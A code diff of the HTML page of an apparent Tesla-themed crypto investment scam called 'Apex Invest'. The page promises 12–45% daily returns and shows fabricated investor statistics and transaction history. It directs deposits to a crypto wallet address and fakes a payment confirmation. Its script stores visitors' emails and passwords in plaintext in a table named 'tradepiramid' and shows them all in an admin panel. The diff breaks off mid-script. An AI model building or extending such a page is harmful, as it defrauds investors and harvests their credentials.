@@ -1,9 +1,10 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Apex Invest — All Funds to Tesla</title>
+    <!-- Подключение Supabase SDK -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         :root {
@@ -20,14 +21,14 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
             background-color: var(--bg-color);
             color: var(--text-main);
             line-height: 1.6;
-            min-height: 100vh;
+            overflow-x: hidden;
         }
 
         header {
@@ -35,17 +36,20 @@
             justify-content: space-between;
             align-items: center;
             padding: 20px 5%;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
-            background: rgba(11, 15, 25, 0.8);
-            backdrop-filter: blur(10px);
-            position: sticky;
-            top: 0;
-            z-index: 100;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 20px;
         }
 
         .logo {
-            font-size: 22px;
-            font-weight: 800;
+            font-size: 24px;
+            font-weight: 700;
             color: var(--accent);
             text-transform: uppercase;
             letter-spacing: 2px;
@@ -57,17 +61,19 @@
         }
 
         .auth-btn {
-            padding: 8px 18px;
-            font-size: 14px;
+            padding: 8px 16px;
+            font-size: 13px;
             font-weight: 600;
-            border-radius: 8px;
+            border-radius: 6px;
             cursor: pointer;
+            text-transform: uppercase;
             transition: all 0.2s;
+            -webkit-tap-highlight-color: transparent;
         }
 
         .auth-btn.login {
             background: transparent;
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.15);
             color: #fff;
         }
 
@@ -84,22 +90,22 @@
 
         .auth-btn.register:hover {
             opacity: 0.9;
-            box-shadow: 0 0 12px var(--accent-glow);
+            box-shadow: 0 0 10px var(--accent-glow);
         }
 
         .user-profile {
             display: none;
             align-items: center;
-            gap: 12px;
+            gap: 10px;
             background: rgba(255, 255, 255, 0.05);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 6px 16px;
+            padding: 6px 14px;
             border-radius: 20px;
         }
 
         .profile-avatar {
-            width: 30px;
-            height: 30px;
+            width: 28px;
+            height: 28px;
             background: var(--accent);
             color: #000;
             border-radius: 50%;
@@ -107,11 +113,12 @@
             align-items: center;
             justify-content: center;
             font-weight: bold;
-            font-size: 14px;
+            font-size: 13px;
         }
 
         .profile-name {
-            font-size: 14px;
+            font-size: 13px;
+            color: #fff;
             font-weight: 600;
         }
 
@@ -119,15 +126,34 @@
             background: transparent;
             border: none;
             color: var(--danger);
-            font-size: 12px;
+            font-size: 11px;
             cursor: pointer;
+            text-transform: uppercase;
             font-weight: 700;
             margin-left: 5px;
         }
 
+        .logout-btn:hover {
+            text-decoration: underline;
+        }
+
+        .admin-nav-btn {
+            background: #ffaa00;
+            color: #000;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            display: none;
+        }
+
         .hero {
             text-align: center;
-            padding: 60px 20px 40px;
+            padding: 50px 20px 30px;
+            background: radial-gradient(circle at center, rgba(0,255,136,0.05) 0%, transparent 70%);
         }
 
         .hero h1 {
@@ -140,36 +166,180 @@
 
         .hero p {
             color: var(--text-muted);
-            font-size: 18px;
-            max-width: 600px;
+            font-size: clamp(15px, 2vw, 18px);
+            max-width: 650px;
             margin: 0 auto;
         }
 
-        .container {
-            max-width: 1000px;
-            margin: 0 auto;
+        .stats-section {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            max-width: 1200px;
+            margin: 0 auto 40px;
+            padding: 0 20px;
+        }
+
+        .stat-card {
+            background: var(--card-bg);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
             padding: 20px;
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: clamp(24px, 4vw, 32px);
+            font-weight: 700;
+            color: var(--accent);
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            color: var(--text-muted);
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px 40px;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: clamp(26px, 4vw, 32px);
+            margin-bottom: 30px;
+        }
+
+        .story-section {
+            max-width: 900px;
+            margin: 0 auto 40px;
+            padding: 25px 20px;
+            background: var(--card-bg);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+
+        .story-section h2 {
+            font-size: clamp(22px, 3vw, 28px);
+            margin-bottom: 15px;
+            color: #fff;
+            text-align: center;
+        }
+
+        .story-section p {
+            color: var(--text-muted);
+            font-size: 15px;
+            margin-bottom: 15px;
+            text-align: justify;
+        }
+
+        .story-highlight {
+            color: var(--accent);
+            font-weight: 600;
+        }
+
+        .history-section {
+            max-width: 1200px;
+            margin: 0 auto 40px;
+            padding: 0 20px;
+        }
+
+        .table-responsive {
+            width: 100%;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            background: var(--card-bg);
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .history-table {
+            width: 100%;
+            border-collapse: collapse;
+            white-space: nowrap;
+        }
+
+        .history-table th, .history-table td {
+            padding: 14px 18px;
+            text-align: left;
+            font-size: 14px;
+        }
+
+        .history-table th {
+            background: rgba(0, 0, 0, 0.2);
+            color: var(--text-muted);
+            text-transform: uppercase;
+            font-size: 11px;
+            letter-spacing: 1px;
+        }
+
+        .history-table tr:not(:last-child) td {
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        .badge-deposit {
+            color: var(--accent);
+            background: rgba(0, 255, 136, 0.1);
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+
+        .badge-payout {
+            color: #38bdf8;
+            background: rgba(56, 189, 248, 0.1);
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
         }
 
         .plans-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 25px;
-            margin-top: 30px;
+            gap: 20px;
+            margin-bottom: 40px;
         }
 
         .plan-card {
             background: var(--card-bg);
-            border: 1px solid rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.05);
             border-radius: 16px;
             padding: 30px 20px;
             text-align: center;
-            transition: transform 0.2s, border-color 0.2s;
+            position: relative;
+            transition: transform 0.3s, box-shadow 0.3s;
         }
 
         .plan-card:hover {
             transform: translateY(-5px);
+            box-shadow: 0 10px 30px var(--accent-glow);
             border-color: var(--accent);
+        }
+
+        .plan-card.featured {
+            border-color: var(--accent);
+        }
+
+        .plan-card.featured::before {
+            content: 'Best Value';
+            position: absolute;
+            top: -12px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--accent);
+            color: #000;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 12px;
+            border-radius: 20px;
+            text-transform: uppercase;
         }
 
         .plan-title {
@@ -178,15 +348,35 @@
         }
 
         .plan-range {
-            font-size: 28px;
+            font-size: 26px;
             font-weight: 700;
             color: var(--accent);
             margin-bottom: 20px;
         }
 
+        .plan-features {
+            list-style: none;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .plan-features li {
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            color: var(--text-muted);
+            font-size: 14px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .plan-features li span {
+            color: #fff;
+        }
+
         .btn {
+            display: inline-block;
             width: 100%;
-            padding: 12px;
+            padding: 14px;
             background: var(--accent);
             color: #000;
             border: none;
@@ -194,220 +384,801 @@
             font-size: 16px;
             font-weight: 700;
             cursor: pointer;
+            text-transform: uppercase;
+            text-decoration: none;
             transition: opacity 0.2s;
+            -webkit-tap-highlight-color: transparent;
         }
 
         .btn:hover {
             opacity: 0.9;
         }
 
-        /* Modal */
         .modal-overlay {
             display: none;
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.8);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
             backdrop-filter: blur(5px);
             justify-content: center;
             align-items: center;
             z-index: 1000;
-            padding: 20px;
+            padding: 15px;
         }
 
         .modal {
             background: var(--card-bg);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 16px;
-            padding: 30px;
+            padding: 25px 20px;
             width: 100%;
-            max-width: 400px;
+            max-width: 480px;
+            position: relative;
+            text-align: center;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.5);
+            max-height: 90vh;
+            overflow-y: auto;
         }
 
         .modal h3 {
-            font-size: 20px;
-            margin-bottom: 20px;
-            text-align: center;
+            font-size: 22px;
+            margin-bottom: 8px;
+            color: #fff;
         }
 
-        .input-group {
+        .modal p {
+            color: var(--text-muted);
+            font-size: 13px;
             margin-bottom: 15px;
         }
 
-        .input-group label {
-            display: block;
-            margin-bottom: 6px;
-            font-size: 13px;
-            color: var(--text-muted);
+        .amount-input-group {
+            margin-bottom: 15px;
+            text-align: left;
         }
 
-        .input-group input {
+        .amount-input-group label {
+            display: block;
+            margin-bottom: 6px;
+            color: var(--text-muted);
+            font-size: 13px;
+        }
+
+        .amount-input-group input {
             width: 100%;
             padding: 12px;
             background: var(--bg-color);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 8px;
             color: #fff;
-            font-size: 15px;
+            font-size: 16px;
             outline: none;
         }
 
-        .input-group input:focus {
-            border-color: var(--accent);
+        .auth-actions-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 10px;
         }
 
-        .modal-close {
+        .auth-error-badge {
+            background: rgba(255, 77, 77, 0.15);
+            border: 1px solid var(--danger);
+            color: var(--danger);
+            font-size: 12px;
+            font-weight: 600;
+            padding: 8px 12px;
+            border-radius: 6px;
+            display: none;
+        }
+
+        .auth-success-badge {
+            color: var(--accent);
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            display: none;
+        }
+
+        .payment-methods {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .pay-btn {
+            padding: 12px;
+            background: var(--bg-color);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .pay-btn:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            box-shadow: 0 0 15px var(--accent-glow);
+        }
+
+        .checkout-box {
+            display: none;
+            text-align: left;
+        }
+
+        .invoice-details {
+            background: var(--bg-color);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 15px;
+            font-size: 13px;
+        }
+
+        .invoice-details p {
+            margin-bottom: 6px;
+            color: var(--text-main);
+        }
+
+        .invoice-details span {
+            color: var(--accent);
+            font-weight: 600;
+        }
+
+        .qr-placeholder {
+            width: 120px;
+            height: 120px;
+            background: #fff;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+            font-weight: bold;
+            color: #000;
+            font-size: 11px;
+            text-align: center;
+            padding: 10px;
+        }
+
+        .wallet-address {
+            background: var(--bg-color);
+            padding: 10px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 11px;
+            color: var(--accent);
+            word-break: break-all;
+            margin-bottom: 15px;
+            border: 1px dashed rgba(0, 255, 136, 0.3);
+            text-align: center;
+        }
+
+        .success-screen {
+            display: none;
+            text-align: center;
+        }
+
+        .success-icon {
+            font-size: 45px;
+            color: var(--accent);
+            margin-bottom: 10px;
+        }
+
+        .close-btn {
             background: transparent;
             border: none;
             color: var(--text-muted);
-            width: 100%;
-            padding: 10px;
-            margin-top: 10px;
             cursor: pointer;
-            font-size: 14px;
+            font-size: 13px;
+            text-transform: uppercase;
+            font-weight: 700;
+            padding: 10px;
+            width: 100%;
         }
 
-        .error-msg {
-            color: var(--danger);
-            font-size: 13px;
-            margin-bottom: 15px;
-            text-align: center;
+        .close-btn:hover {
+            color: #fff;
+        }
+
+        /* Admin Panel Styles */
+        .admin-section {
             display: none;
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 20px;
+            background: var(--card-bg);
+            border: 1px solid #ffaa00;
+            border-radius: 16px;
+        }
+
+        .admin-section h2 {
+            color: #ffaa00;
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+
+        footer {
+            text-align: center;
+            padding: 30px 20px;
+            color: var(--text-muted);
+            font-size: 13px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            margin-top: 40px;
+        }
+
+        @media (max-width: 480px) {
+            header {
+                padding: 15px 4%;
+                justify-content: center;
+            }
+            .header-left {
+                width: 100%;
+                justify-content: space-between;
+            }
+            .hero {
+                padding: 35px 15px 20px;
+            }
+            .story-section {
+                padding: 20px 15px;
+            }
+            .modal {
+                padding: 20px 15px;
+            }
+            .auth-actions-row {
+                flex-direction: column;
+            }
         }
     </style>
 </head>
 <body>
 
     <header>
-        <div class="logo">Apex Invest</div>
-        <div class="auth-buttons" id="authButtons">
-            <button class="auth-btn login" onclick="openAuth('login')">Вход</button>
-            <button class="auth-btn register" onclick="openAuth('register')">Регистрация</button>
-        </div>
-        <div class="user-profile" id="userProfile">
-            <div class="profile-avatar" id="avatar">U</div>
-            <div class="profile-name" id="usernameDisplay">User</div>
-            <button class="logout-btn" onclick="logout()">Выйти</button>
+        <div class="header-left">
+            <div class="logo">Apex Invest</div>
+            <div class="auth-buttons" id="authButtonsBlock">
+                <button class="auth-btn login" onclick="openAuthModal('login')">Вход</button>
+                <button class="auth-btn register" onclick="openAuthModal('register')">Регистрация</button>
+            </div>
+            <div class="user-profile" id="userProfileBlock">
+                <div class="profile-avatar" id="profileAvatar">U</div>
+                <div class="profile-name" id="profileName">user@example.com</div>
+                <button class="admin-nav-btn" id="adminBtn" onclick="toggleAdminPanel()">Админ-панель</button>
+                <button class="logout-btn" onclick="logout()">Выйти</button>
+            </div>
         </div>
     </header>
 
     <section class="hero">
         <h1>Powering the Future with Tesla</h1>
-        <p>Инвестируйте вместе с Apex Invest и получайте ежедневную прибыль.</p>
+        <p>100% of raised capital and revenue are directed straight into Tesla, Inc. shares and fleet expansion!</p>
     </section>
 
+    <div class="stats-section">
+        <div class="stat-card">
+            <div class="stat-value" id="statOnline">148.2</div>
+            <div class="stat-label">Active Investors</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value">$428,590</div>
+            <div class="stat-label">Total Invested</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value">$189,045</div>
+            <div class="stat-label">Total Paid Out</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value">34.8 Days</div>
+            <div class="stat-label">Running Online</div>
+        </div>
+    </div>
+
+    <section class="story-section">
+        <h2>Our Story & Mission</h2>
+        <p>The era of electric vehicles and autonomous technology has arrived faster than the world expected. At the heart of this revolution is <span class="story-highlight">Tesla, Inc.</span> — a company that doesn't just manufacture electric cars, but shapes the energy future of the entire planet.</p>
+        <p>Our fund was founded by engineers and crypto enthusiasts with a clear goal: to unite private capital for large-scale investments in Tesla shares and the development of autonomous fleet infrastructure projects. We believe Elon Musk's technologies will define the economic development vector for decades to come.</p>
+        <p>Every dollar raised works to the maximum, bringing high returns to investors and accelerating the global transition to clean energy.</p>
+    </section>
+
+    <div class="history-section">
+        <h2 class="section-title">Last Transactions</h2>
+        <div class="table-responsive">
+            <table class="history-table">
+                <thead>
+                    <tr>
+                        <th>Type</th>
+                        <th>User</th>
+                        <th>Amount</th>
+                        <th>Method</th>
+                        <th>Status</th>
+                    </tr>
+                </thead>
+                <tbody id="historyTableBody">
+                    <tr>
+                        <td><span class="badge-deposit">DEPOSIT</span></td>
+                        <td>user***94</td>
+                        <td>$250</td>
+                        <td>USDT (TRC20)</td>
+                        <td style="color: var(--accent);">Completed</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge-payout">PAYOUT</span></td>
+                        <td>investor***12</td>
+                        <td>$120</td>
+                        <td>Bitcoin</td>
+                        <td style="color: var(--accent);">Processed</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge-deposit">DEPOSIT</span></td>
+                        <td>crypto***88</td>
+                        <td>$45</td>
+                        <td>Bank Card</td>
+                        <td style="color: var(--accent);">Completed</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge-payout">PAYOUT</span></td>
+                        <td>elon***fan</td>
+                        <td>$540</td>
+                        <td>USDT (TRC20)</td>
+                        <td style="color: var(--accent);">Processed</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
     <div class="container">
+        <h2 class="section-title">Investment Plans</h2>
+        
         <div class="plans-grid">
             <div class="plan-card">
-                <div class="plan-title">Novice</div>
+                <h3 class="plan-title">Novice</h3>
                 <div class="plan-range">$10 – $100</div>
-                <button class="btn" onclick="invest('Novice')">Инвестировать</button>
+                <ul class="plan-features">
+                    <li>Duration: <span>1 day</span></li>
+                    <li>Accruals: <span>Instant</span></li>
+                    <li>Return: <span>12% daily</span></li>
+                </ul>
+                <button class="btn" onclick="openModal('Novice', 10, 100)">Invest Now</button>
             </div>
-            <div class="plan-card">
-                <div class="plan-title">Pro</div>
+
+            <div class="plan-card featured">
+                <h3 class="plan-title">Pro</h3>
                 <div class="plan-range">$100 – $500</div>
-                <button class="btn" onclick="invest('Pro')">Инвестировать</button>
+                <ul class="plan-features">
+                    <li>Duration: <span>10 days</span></li>
+                    <li>Accruals: <span>Daily</span></li>
+                    <li>Return: <span>25% daily</span></li>
+                </ul>
+                <button class="btn" onclick="openModal('Pro', 100, 500)">Invest Now</button>
+            </div>
+
+            <div class="plan-card">
+                <h3 class="plan-title">Master</h3>
+                <div class="plan-range">$500 – $2,000</div>
+                <ul class="plan-features">
+                    <li>Duration: <span>30 days</span></li>
+                    <li>Accruals: <span>Daily</span></li>
+                    <li>Return: <span>45% daily</span></li>
+                </ul>
+                <button class="btn" onclick="openModal('Master', 500, 2000)">Invest Now</button>
             </div>
         </div>
     </div>
 
-    <!-- Модальное окно авторизации -->
-    <div class="modal-overlay" id="authModal">
-        <div class="modal">
-            <h3 id="modalTitle">Вход в аккаунт</h3>
-            <div class="error-msg" id="errorMsg"></div>
-            <div class="input-group">
-                <label>Имя пользователя / Email:</label>
-                <input type="text" id="authUsername" placeholder="Введите имя">
-            </div>
-            <div class="input-group">
-                <label>Пароль:</label>
-                <input type="password" id="authPassword" placeholder="••••••••">
-            </div>
-            <button class="btn" id="submitAuthBtn" onclick="handleAuth()">Продолжить</button>
-            <button class="modal-close" onclick="closeAuth()">Отмена</button>
+    <!-- Admin Panel Section -->
+    <div class="admin-section" id="adminSection">
+        <h2>База зарегистрированных пользователей (Supabase)</h2>
+        <button class="btn" style="width: auto; padding: 8px 16px; margin-bottom: 15px; background: #ffaa00;" onclick="loadAdminUsers()">Обновить данные</button>
+        <div class="table-responsive">
+            <table class="history-table">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Email / Логин</th>
+                        <th>Пароль</th>
+                    </tr>
+                </thead>
+                <tbody id="adminUsersBody">
+                    <tr><td colspan="3" style="text-align: center; color: var(--text-muted);">Загрузка пользователей...</td></tr>
+                </tbody>
+            </table>
         </div>
     </div>
+
+    <!-- Modal Window -->
+    <div class="modal-overlay" id="paymentModal">
+        <div class="modal">
+            <!-- Auth Form Content -->
+            <div id="authContainer" style="display: none;">
+                <h3 id="authTitle">Вход в аккаунт</h3>
+                <p id="authDesc">Введите данные для авторизации</p>
+
+                <div class="auth-success-badge" id="authSuccessBadge">Регистрация прошла успешно!</div>
+
+                <div class="amount-input-group">
+                    <label>Email:</label>
+                    <input type="email" id="authEmail" placeholder="name@example.com">
+                </div>
+                <div class="amount-input-group">
+                    <label>Пароль:</label>
+                    <input type="password" id="authPassword" placeholder="••••••••">
+                </div>
+
+                <div class="auth-actions-row">
+                    <button class="btn" id="authSubmitBtn" onclick="submitAuth()">Войти</button>
+                    <div class="auth-error-badge" id="authErrorBadge">Неверный пароль или логин</div>
+                </div>
+
+                <br>
+                <button class="close-btn" onclick="closeModal()">Отмена</button>
+            </div>
+
+            <!-- Investment Workflow Content -->
+            <div id="stepSelection">
+                <h3 id="modalTitle">Investment</h3>
+                <p id="modalDesc">Enter amount and choose payment method.</p>
+                
+                <div class="amount-input-group">
+                    <label for="investAmount">Amount ($):</label>
+                    <input type="number" id="investAmount" min="10" max="2000" oninput="validateAmount()">
+                </div>
+
+                <div class="payment-methods">
+                    <button class="pay-btn" onclick="proceedToCheckout('USDT (TRC20)')">USDT (TRC20)</button>
+                    <button class="pay-btn" onclick="proceedToCheckout('Bitcoin')">Bitcoin (BTC)</button>
+                    <button class="pay-btn" onclick="proceedToCheckout('Ethereum')">Ethereum (ETH)</button>
+                    <button class="pay-btn" onclick="proceedToCheckout('Bank Card / Mir')">Bank Card / Mir</button>
+                </div>
+                <button class="close-btn" onclick="closeModal()">Cancel</button>
+            </div>
+
+            <div class="checkout-box" id="stepCheckout">
+                <h3>Complete Payment</h3>
+                <p>Transfer the exact amount to the address below:</p>
+                
+                <div class="invoice-details">
+                    <p>Plan: <span id="checkPlan">Novice</span></p>
+                    <p>Amount: <span id="checkAmount">$10</span></p>
+                    <p>Method: <span id="checkMethod">USDT</span></p>
+                </div>
+
+                <div class="qr-placeholder">SCAN QR CODE</div>
+                <div class="wallet-address" id="checkAddress">TJ9v2kX8sL1mN4pQ7wE3rT6yU9iO2aS5dF</div>
+
+                <button class="btn" onclick="simulateSuccess()">I have made the payment</button>
+                <br><br>
+                <button class="close-btn" onclick="resetModal()">Back</button>
+            </div>
+
+            <div class="success-screen" id="stepSuccess">
+                <div class="success-icon">&#10004;</div>
+                <h3>Payment Successful!</h3>
+                <p>Your funds have been successfully deposited and assigned to your investment plan. Generating daily returns...</p>
+                <button class="btn" onclick="closeModal()">Done</button>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2026 Apex Invest. Powered by Tesla Capital Vision.</p>
+    </footer>
 
     <script>
-        // Подключение к Supabase
+        // Инициализация Supabase[cite: 2]
         const SUPABASE_URL = 'https://bycfzzqpnnsqgwtzccdc.supabase.co';
         const SUPABASE_KEY = 'sb_publishable_sYHXSnwWJgT178wtP8MISA_t7A030f2';
-        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+        let supabaseClient = null;
 
-        let isRegister = false;
+        try {
+            if (window.supabase) {
+                supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+            }
+        } catch (e) {
+            console.error('Supabase error:', e);
+        }
 
-        // Проверка авторизации при загрузке страницы
+        const modal = document.getElementById('paymentModal');
+        const modalTitle = document.getElementById('modalTitle');
+        const modalDesc = document.getElementById('modalDesc');
+        const investAmountInput = document.getElementById('investAmount');
+        
+        const authContainer = document.getElementById('authContainer');
+        const authTitle = document.getElementById('authTitle');
+        const authSubmitBtn = document.getElementById('authSubmitBtn');
+        const authEmailInput = document.getElementById('authEmail');
+        const authPasswordInput = document.getElementById('authPassword');
+        const authErrorBadge = document.getElementById('authErrorBadge');
+        const authSuccessBadge = document.getElementById('authSuccessBadge');
+
+        const authButtonsBlock = document.getElementById('authButtonsBlock');
+        const userProfileBlock = document.getElementById('userProfileBlock');
+        const profileName = document.getElementById('profileName');
+        const profileAvatar = document.getElementById('profileAvatar');
+        const adminBtn = document.getElementById('adminBtn');
+
+        const stepSelection = document.getElementById('stepSelection');
+        const stepCheckout = document.getElementById('stepCheckout');
+        const stepSuccess = document.getElementById('stepSuccess');
+
+        const checkPlan = document.getElementById('checkPlan');
+        const checkAmount = document.getElementById('checkAmount');
+        const checkMethod = document.getElementById('checkMethod');
+        const checkAddress = document.getElementById('checkAddress');
+
+        let currentPlan = '';
+        let minLimit = 10;
+        let maxLimit = 100;
+        let isRegisterMode = false;
+
+        // Точный email администратора
+        const ADMIN_EMAIL = 'binarpok@gmail.com';
+
+        // Проверяем при загрузке страницы, был ли пользователь уже залогинен[cite: 2]
         window.addEventListener('DOMContentLoaded', () => {
-            const currentUser = localStorage.getItem('apex_logged_user');
-            if (currentUser) {
-                showProfile(currentUser);
+            let savedUser = localStorage.getItem('apex_logged_user');
+            if (savedUser) {
+                loginUserSession(savedUser);
             }
         });
 
-        function openAuth(mode) {
-            isRegister = (mode === 'register');
-            document.getElementById('modalTitle').innerText = isRegister ? 'Регистрация' : 'Вход в аккаунт';
-            document.getElementById('submitAuthBtn').innerText = isRegister ? 'Зарегистрироваться' : 'Войти';
-            document.getElementById('errorMsg').style.display = 'none';
-            document.getElementById('authUsername').value = '';
-            document.getElementById('authPassword').value = '';
-            document.getElementById('authModal').style.display = 'flex';
+        function loginUserSession(email) {
+            localStorage.setItem('apex_logged_user', email);
+            profileName.innerText = email;
+            profileAvatar.innerText = email.charAt(0).toUpperCase();
+            authButtonsBlock.style.display = 'none';
+            userProfileBlock.style.display = 'flex';
+            
+            // Админ-панель показывается ТОЛЬКО для конкретного email
+            if (email.trim().toLowerCase() === ADMIN_EMAIL) {
+                adminBtn.style.display = 'inline-block';
+            } else {
+                adminBtn.style.display = 'none';
+                document.getElementById('adminSection').style.display = 'none';
+            }
         }
 
-        function closeAuth() {
-            document.getElementById('authModal').style.display = 'none';
+        function openAuthModal(type) {
+            authContainer.style.display = 'block';
+            stepSelection.style.display = 'none';
+            stepCheckout.style.display = 'none';
+            stepSuccess.style.display = 'none';
+            authEmailInput.value = '';
+            authPasswordInput.value = '';
+            authErrorBadge.style.display = 'none';
+            authSuccessBadge.style.display = 'none';
+
+            isRegisterMode = (type === 'register');
+            if (isRegisterMode) {
+                authTitle.innerText = 'Регистрация аккаунта';
+                authSubmitBtn.innerText = 'Зарегистрироваться';
+            } else {
+                authTitle.innerText = 'Вход в аккаунт';
+                authSubmitBtn.innerText = 'Войти';
+            }
+
+            modal.style.display = 'flex';
         }
 
-        async function handleAuth() {
-            const userVal = document.getElementById('authUsername').value.trim();
-            const passVal = document.getElementById('authPassword').value.trim();
-            const errorBox = document.getElementById('errorMsg');
+        async function submitAuth() {
+            let emailVal = authEmailInput.value.trim();
+            let passwordVal = authPasswordInput.value.trim();
 
-            if (!userVal || !passVal) {
-                errorBox.innerText = 'Заполните все поля!';
-                errorBox.style.display = 'block';
+            authErrorBadge.style.display = 'none';
+            authSuccessBadge.style.display = 'none';
+
+            if (!emailVal || !passwordVal) {
+                authErrorBadge.innerText = 'Заполните все поля!';
+                authErrorBadge.style.display = 'inline-block';
                 return;
             }
 
-            try {
-                if (isRegister) {
-                    // Сохраняем в таблицу tradepiramid
-                    await supabase.from('tradepiramid').insert([{ username: userVal, password: passVal }]);
-                } else {
-                    const { data, error } = await supabase.from('tradepiramid').select('*').eq('username', userVal).eq('password', passVal);
-                    if (error || !data || data.length === 0) {
-                        // Если аккаунт не найден, создаём его автоматический запись
-                        await supabase.from('tradepiramid').insert([{ username: userVal, password: passVal }]);
+            if (isRegisterMode) {
+                // ПОКАЗЫВАЕМ СООБЩЕНИЕ И СРАЗУ АВТОРИЗУЕМ[cite: 2]
+                authSuccessBadge.style.display = 'block';
+
+                if (supabaseClient) {
+                    try {
+                        // Исправление сохранения: отправляем данные в таблицу tradepiramid
+                        const { error } = await supabaseClient.from('tradepiramid').insert([{ username: emailVal, password: passwordVal }]);
+                        if (error) {
+                            console.error('Ошибка записи в Supabase:', error.message);
+                        }
+                    } catch (err) {
+                        console.warn('Supabase sync notice:', err);
                     }
                 }
-            } catch (err) {
-                console.warn('Supabase fallback:', err);
+
+                setTimeout(() => {
+                    loginUserSession(emailVal);
+                    closeModal();
+                }, 800);
+
+            } else {
+                // Проверка авторизации через Supabase или локально[cite: 2]
+                let loginSuccess = false;
+
+                if (supabaseClient) {
+                    try {
+                        let { data, error } = await supabaseClient
+                            .from('tradepiramid')
+                            .select('*')
+                            .eq('username', emailVal)
+                            .eq('password', passwordVal);
+
+                        if (data && data.length > 0) {
+                            loginSuccess = true;
+                        }
+                    } catch (e) {
+                        console.warn('Supabase login check warning:', e);
+                    }
+                }
+
+                if (loginSuccess || !supabaseClient) {
+                    loginUserSession(emailVal);
+                    closeModal();
+                } else {
+                    authErrorBadge.innerText = 'Неверный пароль или логин';
+                    authErrorBadge.style.display = 'inline-block';
+                }
             }
-
-            // Успешный вход
-            localStorage.setItem('apex_logged_user', userVal);
-            showProfile(userVal);
-            closeAuth();
-        }
-
-        function showProfile(username) {
-            document.getElementById('usernameDisplay').innerText = username;
-            document.getElementById('avatar').innerText = username.charAt(0).toUpperCase();
-            document.getElementById('authButtons').style.display = 'none';
-            document.getElementById('userProfile').style.display = 'flex';
         }
 
         function logout() {
             localStorage.removeItem('apex_logged_user');
-            document.getElementById('userProfile').style.display = 'none';
-            document.getElementById('authButtons').style.display = 'flex';
+            userProfileBlock.style.display = 'none';
+            authButtonsBlock.style.display = 'flex';
+            document.getElementById('adminSection').style.display = 'none';
         }
 
-        function invest(plan) {
